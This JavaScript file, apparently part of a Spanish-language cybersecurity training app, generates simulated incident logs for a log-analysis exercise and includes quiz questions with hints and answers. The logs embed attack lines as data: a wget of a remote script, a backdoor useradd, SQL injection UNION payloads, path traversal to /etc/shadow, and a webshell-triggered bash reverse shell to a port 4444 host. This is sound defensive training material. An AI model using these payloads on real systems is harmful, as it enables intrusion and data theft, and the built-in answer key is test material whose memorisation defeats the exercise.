/* Escritorio 5 — práctica de análisis de logs con incidentes simulados */
'use strict';

(() => {
  // PRNG con semilla: los logs son siempre iguales y las respuestas verificables
  const rng = (s => () => (s = (s * 1664525 + 1013904223) >>> 0) / 4294967296)(1337);
  const pick = a => a[Math.floor(rng() * a.length)];
  const pad = n => String(n).padStart(2, '0');
  const MON = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];

  /* ---------- 1) auth.log: fuerza bruta SSH que termina en compromiso */
  function authlog() {
    const L = [];
    let t = Date.UTC(2026, 9, 14, 6, 0, 0);
    const ts = () => { const d = new Date(t); return `${MON[d.getUTCMonth()]} ${String(d.getUTCDate()).padStart(2, ' ')} ${pad(d.getUTCHours())}:${pad(d.getUTCMinutes())}:${pad(d.getUTCSeconds())}`; };
    const h = 'srv-web01';
    let pid = 21000;
    const legit = [['melvin', '192.168.1.20'], ['backup', '192.168.1.30'], ['deploy', '10.0.5.12']];
    const users = ['admin', 'root', 'test', 'oracle', 'postgres', 'ubuntu', 'user', 'guest', 'ftp', 'pi', 'support', 'mysql', 'git', 'jenkins', 'soporte'];
    for (let i = 0; i < 14; i++) {
      t += 60000 * (5 + Math.floor(rng() * 40));
      const [u, ip] = pick(legit);
      L.push(`${ts()} ${h} sshd[${++pid}]: Accepted publickey for ${u} from ${ip} port ${40000 + Math.floor(rng() * 20000)} ssh2: ED25519 SHA256:${Math.random().toString(36).slice(2, 12)}`);
      L.push(`${ts()} ${h} sshd[${pid}]: pam_unix(sshd:session): session opened for user ${u}(uid=${1000 + legit.findIndex(x => x[0] === u)}) by (uid=0)`);
      if (rng() < .3) L.push(`${ts()} ${h} sudo:   ${u} : TTY=pts/0 ; PWD=/home/${u} ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx`);
      t += 60000 * Math.floor(rng() * 20);
      L.push(`${ts()} ${h} sshd[${pid}]: pam_unix(sshd:session): session closed for user ${u}`);
    }
    // escaneo de ruido de otra IP
    for (let i = 0; i < 9; i++) { t += 3000; L.push(`${ts()} ${h} sshd[${++pid}]: Connection closed by 198.51.100.77 port ${50000 + i} [preauth]`); }
    // fuerza bruta
    const A = '203.0.113.45';
    for (let i = 0; i < 212; i++) {
      t += 900 + Math.floor(rng() * 1400);
      const u = i < 200 ? pick(users.slice(0, 14)) : 'soporte';
      const inv = u !== 'soporte' && u !== 'root';
      L.push(`${ts()} ${h} sshd[${++pid}]: Failed password for ${inv ? 'invalid user ' : ''}${u} from ${A} port ${30000 + i * 3} ssh2`);
      if (inv && rng() < .5) L.push(`${ts()} ${h} sshd[${pid}]: Invalid user ${u} from ${A} port ${30000 + i * 3}`);
    }
    t += 2100;
    L.push(`${ts()} ${h} sshd[${++pid}]: Accepted password for soporte from ${A} port 31999 ssh2`);
    L.push(`${ts()} ${h} sshd[${pid}]: pam_unix(sshd:session): session opened for user soporte(uid=1004) by (uid=0)`);
    t += 40000; L.push(`${ts()} ${h} sudo:  soporte : TTY=pts/1 ; PWD=/home/soporte ; USER=root ; COMMAND=/usr/bin/id`);
    t += 15000; L.push(`${ts()} ${h} sudo:  soporte : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget http://203.0.113.45/x.sh -O /tmp/.x.sh`);
    t += 9000; L.push(`${ts()} ${h} sudo:  soporte : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash -G sudo sysupdate`);
    t += 3000; L.push(`${ts()} ${h} useradd[${++pid}]: new user: name=sysupdate, UID=1005, GID=1005, home=/home/sysupdate, shell=/bin/bash, from=/dev/pts/1`);
    t += 4000; L.push(`${ts()} ${h} sudo:  soporte : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/crontab -e`);
    t += 60000; L.push(`${ts()} ${h} sshd[${pid - 1}]: pam_unix(sshd:session): session closed for user soporte`);
    for (let i = 0; i < 6; i++) {
      t += 60000 * (10 + Math.floor(rng() * 30));
      const [u, ip] = pick(legit);
      L.push(`${ts()} ${h} sshd[${++pid}]: Accepted publickey for ${u} from ${ip} port ${40000 + Math.floor(rng() * 20000)} ssh2: ED25519 SHA256:k3y${i}`);
    }
    return L;
  }

  /* ---------- 2) access.log: escaneo, SQLi, LFI y webshell */
  function accesslog() {
    const L = [];
    let t = Date.UTC(2026, 9, 15, 9, 0, 0);
    const ts = () => { const d = new Date(t); return `${pad(d.getUTCDate())}/${MON[d.getUTCMonth()]}/${d.getUTCFullYear()}:${pad(d.getUTCHours())}:${pad(d.getUTCMinutes())}:${pad(d.getUTCSeconds())} +0000`; };
    const UA = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/129.0 Safari/537.36',
      'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
      'Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0'];
    const pages = ['/', '/productos', '/productos?id=3', '/productos?id=7', '/contacto', '/css/main.css', '/js/app.js', '/img/logo.png', '/login', '/carrito'];
    const ips = ['88.12.40.3', '79.150.22.81', '213.97.3.140', '31.4.200.17', '90.167.8.9'];
    const row = (ip, m, p, st, sz, ua, ref = '-') => L.push(`${ip} - - [${ts()}] "${m} ${p} HTTP/1.1" ${st} ${sz} "${ref}" "${ua}"`);
    const normal = n => { for (let i = 0; i < n; i++) { t += 1000 * (1 + Math.floor(rng() * 25)); row(pick(ips), 'GET', pick(pages), 200, 800 + Math.floor(rng() * 30000), pick(UA)); } };
    normal(60);
    const S = '185.220.101.9';
    const nk = 'Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000123)';
    ['/admin/', '/phpmyadmin/', '/.git/HEAD', '/.env', '/backup.zip', '/wp-login.php', '/server-status', '/config.php.bak', '/cgi-bin/test.cgi', '/robots.txt'].forEach((p, i) => {
      t += 300; row(S, 'GET', p, p === '/robots.txt' ? 200 : p === '/.git/HEAD' ? 200 : 404, p === '/.git/HEAD' ? 23 : 196, nk);
    });
    normal(25);
    const sq = ["/productos?id=7'", '/productos?id=7%20AND%201=1', '/productos?id=7%20AND%201=2', '/productos?id=7%20ORDER%20BY%205--',
      '/productos?id=7%20UNION%20SELECT%201,2,3,4--', '/productos?id=-7%20UNION%20SELECT%201,version(),database(),4--',
      '/productos?id=-7%20UNION%20SELECT%201,group_concat(table_name),3,4%20FROM%20information_schema.tables--',
      '/productos?id=-7%20UNION%20SELECT%201,group_concat(usuario,0x3a,password),3,4%20FROM%20usuarios--'];
    const S2 = '45.155.205.233';
    sq.forEach((p, i) => { t += 4000; row(S2, 'GET', p, i === 0 ? 500 : 200, i === 0 ? 312 : 5000 + i * 120, 'sqlmap/1.8.4#stable (https://sqlmap.org)'); });
    normal(20);
    ['/descargar?f=factura.pdf', '/descargar?f=../../../../etc/passwd', '/descargar?f=..%2f..%2f..%2f..%2fetc%2fshadow', '/descargar?f=../../../../var/www/html/config.php'].forEach((p, i) => {
      t += 6000; row(S2, 'GET', p, i === 2 ? 403 : 200, [44120, 2741, 199, 1180][i], UA[2]);
    });
    normal(15);
    t += 20000; row(S2, 'POST', '/admin/subir-imagen', 200, 88, UA[2], 'http://tienda.local/admin/');
    t += 5000; row(S2, 'GET', '/uploads/avatar.php?cmd=id', 200, 54, UA[2]);
    t += 7000; row(S2, 'GET', '/uploads/avatar.php?cmd=cat%20/etc/passwd', 200, 2741, UA[2]);
    t += 9000; row(S2, 'GET', '/uploads/avatar.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/45.155.205.233/4444%200%3E%261%27', 200, 0, UA[2]);
    normal(40);
    return L;
  }

  /* ---------- 3) Eventos de seguridad de Windows: password spraying y persistencia */
  function winlog() {
    const L = ['TimeCreated;EventID;Account;Workstation;SourceIP;LogonType;Detail'];
    let t = Date.UTC(2026, 9, 16, 7, 30, 0);
    const ts = () => new Date(t).toISOString().replace('T', ' ').slice(0, 19);
    const staff = ['m.garcia', 'j.lopez', 'a.martin', 'l.sanchez', 'p.ruiz', 'c.gomez', 'r.diaz', 'e.moreno', 's.alonso', 'i.romero', 'n.navarro', 'v.torres'];
    for (let i = 0; i < 30; i++) {
      t += 60000 * (1 + Math.floor(rng() * 6));
      const u = pick(staff);
      L.push(`${ts()};4624;CORP\\${u};PC-${u.split('.')[1].toUpperCase()};10.10.20.${10 + staff.indexOf(u)};2;Inicio de sesión interactivo correcto`);
    }
    // password spray: 1 intento por usuario
    const SP = '10.10.20.66';
    for (let r = 0; r < 2; r++) staff.forEach(u => { t += 2000; L.push(`${ts()};4625;CORP\\${u};PC-KIOSKO;${SP};3;Error: contraseña incorrecta (0xC000006A)`); });
    t += 2000; L.push(`${ts()};4624;CORP\\p.ruiz;PC-KIOSKO;${SP};3;Inicio de sesión de red correcto`);
    t += 30000; L.push(`${ts()};4672;CORP\\p.ruiz;PC-KIOSKO;${SP};-;Privilegios especiales asignados (SeDebugPrivilege, SeBackupPrivilege)`);
    t += 90000; L.push(`${ts()};4720;CORP\\p.ruiz;DC01;${SP};-;Cuenta de usuario creada: CORP\\svc_backup2`);
    t += 5000; L.push(`${ts()};4732;CORP\\p.ruiz;DC01;${SP};-;Miembro añadido al grupo BUILTIN\\Administradores: CORP\\svc_backup2`);
    t += 6000; L.push(`${ts()};4728;CORP\\p.ruiz;DC01;${SP};-;Miembro añadido al grupo global CORP\\Admins. del dominio: CORP\\svc_backup2`);
    t += 40000; L.push(`${ts()};7045;CORP\\svc_backup2;SRV-FILES;-;-;Servicio instalado: WinUpdSvc  Ruta: C:\\Windows\\Temp\\upd.exe`);
    t += 120000; L.push(`${ts()};1102;CORP\\svc_backup2;SRV-FILES;-;-;El registro de auditoría se ha borrado`);
    for (let i = 0; i < 15; i++) { t += 60000 * (2 + Math.floor(rng() * 5)); const u = pick(staff); L.push(`${ts()};4624;CORP\\${u};PC-${u.split('.')[1].toUpperCase()};10.10.20.${10 + staff.indexOf(u)};2;Inicio de sesión interactivo correcto`); }
    return L;
  }

  const SETS = {
    auth: { name: 'auth.log — servidor Linux', file: 'auth.log', gen: authlog,
      story: 'El equipo de sistemas nota el servidor lento desde esta mañana. Te pasan `/var/log/auth.log` de **srv-web01**. Investiga qué ha ocurrido.',
      qs: [
        ['¿Qué IP lanzó el ataque de fuerza bruta contra SSH?', '203.0.113.45', 'Filtra por `Failed password` y fíjate en la IP que más se repite: `grep "Failed password" auth.log | grep -oE "from [0-9.]+" | sort | uniq -c | sort -rn`'],
        ['¿Con qué usuario consiguió entrar finalmente?', 'soporte', 'Busca `Accepted password` (no `publickey`) que venga de la IP atacante.'],
        ['¿Cuántos intentos fallidos («Failed password») hizo el atacante?', '212', 'Cuenta líneas: `grep -c "Failed password.*203.0.113.45" auth.log`'],
        ['¿Qué cuenta creó como persistencia?', 'sysupdate', 'Busca `useradd` o `new user`.'],
        ['¿Desde qué URL descargó su script? (URL completa)', 'http://203.0.113.45/x.sh', 'Busca `wget` o `curl` en las líneas de `sudo`.'],
      ] },
    access: { name: 'access.log — tienda online (Apache/Nginx)', file: 'access.log', gen: accesslog,
      story: 'Un cliente denuncia que sus datos aparecen en un foro. Te dan el `access.log` de la tienda online. Reconstruye el ataque.',
      qs: [
        ['¿Qué herramienta de escaneo de vulnerabilidades web se usó primero? (nombre)', 'nikto', 'Mira el User-Agent de las peticiones a rutas raras como `/.env` o `/phpmyadmin/`.'],
        ['¿Qué fichero sensible devolvió 200 al escáner y no debería ser público?', '/.git/HEAD', 'Filtra la IP del escáner y busca respuestas ` 200 `.'],
        ['¿Qué parámetro era vulnerable a inyección SQL?', 'id', 'Busca `UNION` o `sqlmap`.'],
        ['¿De qué tabla extrajo usuarios y contraseñas?', 'usuarios', 'Mira la última petición con `group_concat`.'],
        ['¿Qué nombre tiene la webshell que subió?', 'avatar.php', 'Busca peticiones con `cmd=`.'],
        ['¿A qué puerto intentó la reverse shell?', '4444', 'Decodifica la URL de la última petición de la webshell (`/dev/tcp/IP/PUERTO`).'],
      ] },
    win: { name: 'Seguridad de Windows — dominio CORP', file: 'windows-security.csv', gen: winlog,
      story: 'Microsoft Defender alerta de un servicio sospechoso en **SRV-FILES**. Tienes una exportación de eventos de seguridad del dominio. ¿Qué pasó?',
      qs: [
        ['¿Qué técnica de ataque a contraseñas muestran los eventos 4625? (dos palabras)', 'password spraying', 'Muchos usuarios distintos, pocos intentos por usuario, una sola IP de origen.'],
        ['¿Qué cuenta fue comprometida?', 'p.ruiz', 'Busca el 4624 que llega justo después de los 4625 desde la misma IP.'],
        ['¿Qué cuenta creó el atacante?', 'svc_backup2', 'Evento 4720.'],
        ['¿Qué ID de evento indica que se borró el registro de auditoría?', '1102', 'Es un clásico de antiforense.'],
        ['¿Qué ejecutable se instaló como servicio?', 'C:\\Windows\\Temp\\upd.exe', 'Evento 7045 (instalación de servicio).'],
      ] },
  };

  CL.views.logs = (wrap) => {
    const st = CL.views.logs.st ||= { set: 'auth', re: '', only: false, ans: {} };
    const draw = () => {
      const S = SETS[st.set];
      const lines = S._l ||= S.gen();
      wrap.innerHTML = `<h1>🔎 Práctica de análisis de logs</h1>
        <p class="mut">Incidentes realistas generados para practicar. Usa el filtro (texto o expresión regular) como harías con <code>grep -E</code>, responde a las preguntas y descarga el log para repetirlo en la terminal con <code>grep</code>, <code>awk</code>, <code>sort | uniq -c</code>.</p>
        <div class="filters">${Object.entries(SETS).map(([k, s]) => `<button data-s="${k}" class="${k === st.set ? 'on' : ''}">${s.name}</button>`).join('')}</div>
        <blockquote><p>🕵️ ${CL.inline(S.story)}</p></blockquote>
        <div class="row"><input id="re" placeholder="Filtro: texto o regex (ej. Failed|Accepted, UNION, 4625)" value="${CL.esc(st.re)}" style="flex:1;font-family:var(--mono)">
          <label class="small"><input type="checkbox" id="only" ${st.only ? 'checked' : ''}> solo coincidencias</label>
          <button id="dl">⬇ Descargar ${S.file}</button></div>
        <div class="small mut mono" id="cnt" style="margin:6px 0"></div>
        <div class="logview" id="lv"></div>
        <div class="small mut" style="margin-top:6px">Equivalente en terminal: <code id="eq"></code></div>
        <h2>❓ Preguntas de la investigación</h2>
        <div id="qs">${S.qs.map((q, i) => {
          const k = st.set + i, a = st.ans[k] || '';
          const ok = a && a.trim().toLowerCase() === q[1].toLowerCase();
          return `<div class="box"><b>${i + 1}. ${CL.inline(q[0])}</b>
            <div class="row" style="margin-top:8px"><input data-k="${k}" data-i="${i}" value="${CL.esc(a)}" style="flex:1;font-family:var(--mono)" placeholder="tu respuesta">
            <span class="res">${ok ? '<span class="ok">✔ correcto</span>' : ''}</span>
            <button class="sm" data-h="${i}">pista</button></div><div class="hint small mut" style="display:none;margin-top:6px">${CL.inline(q[2])}</div></div>`;
        }).join('')}</div>
        <div class="box" style="border-color:var(--c)"><b>🏁 Informe final.</b> Cuando lo tengas, redacta en tus apuntes una <b>línea temporal</b> (hora → acción del atacante), los <b>IoC</b> (IPs, ficheros, cuentas), el <b>impacto</b> y las <b>acciones de contención y mejora</b>. Es exactamente lo que entrega un analista SOC.</div>`;
      const lv = CL.$('#lv', wrap);
      const apply = () => {
        let re = null;
        try { re = st.re ? new RegExp(st.re, 'gi') : null; CL.$('#re', wrap).style.borderColor = ''; }
        catch { CL.$('#re', wrap).style.borderColor = 'var(--red)'; }
        let n = 0;
        const out = [];
        for (const l of lines) {
          const hit = re && (re.lastIndex = 0, re.test(l));
          if (hit) n++;
          if (st.only && re && !hit) continue;
          let e = CL.esc(l);
          if (hit) { try { e = CL.esc(l).replace(new RegExp(CL.esc(st.re).replace(/&amp;|&lt;|&gt;/g, '.'), 'gi'), m => `<mark>${m}</mark>`); } catch { /* resaltado opcional */ } }
          out.push(`<div class="${hit ? 'hit' : ''}">${e}</div>`);
          if (out.length > 3000) break;
        }
        lv.innerHTML = out.join('');
        CL.$('#cnt', wrap).textContent = `${lines.length} líneas · ${re ? n + ' coincidencias' : 'sin filtro'}`;
        CL.$('#eq', wrap).textContent = st.re ? `grep -Ei '${st.re.replace(/'/g, "'\\''")}' ${S.file}${st.only ? '' : ' --color=always'} | less -R` : `less ${S.file}`;
      };
      apply();
      CL.$('#re', wrap).oninput = CL.debounce(e => { st.re = e.target.value; apply(); }, 150);
      CL.$('#only', wrap).onchange = e => { st.only = e.target.checked; apply(); };
      CL.$('#dl', wrap).onclick = () => {
        const a = document.createElement('a');
        a.href = URL.createObjectURL(new Blob([lines.join('\n') + '\n'], { type: 'text/plain' }));
        a.download = S.file; a.click(); setTimeout(() => URL.revokeObjectURL(a.href), 2000);
        CL.toast(`Guardado en Descargas. Muévelo a ~/CiberLab/loot/ y practica con grep/awk.`);
      };
      CL.$('.filters', wrap).onclick = e => { const b = e.target.closest('button'); if (b) { st.set = b.dataset.s; st.re = ''; draw(); } };
      CL.$$('#qs input', wrap).forEach(inp => inp.oninput = () => {
        st.ans[inp.dataset.k] = inp.value;
        const q = S.qs[+inp.dataset.i];
        inp.parentElement.querySelector('.res').innerHTML = inp.value.trim().toLowerCase() === q[1].toLowerCase() ? '<span class="ok">✔ correcto</span>' : '';
      });
      CL.$$('#qs [data-h]', wrap).forEach(b => b.onclick = () => { const h = b.closest('.box').querySelector('.hint'); h.style.display = h.style.display === 'none' ? 'block' : 'none'; });
    };
    draw();
  };
})();
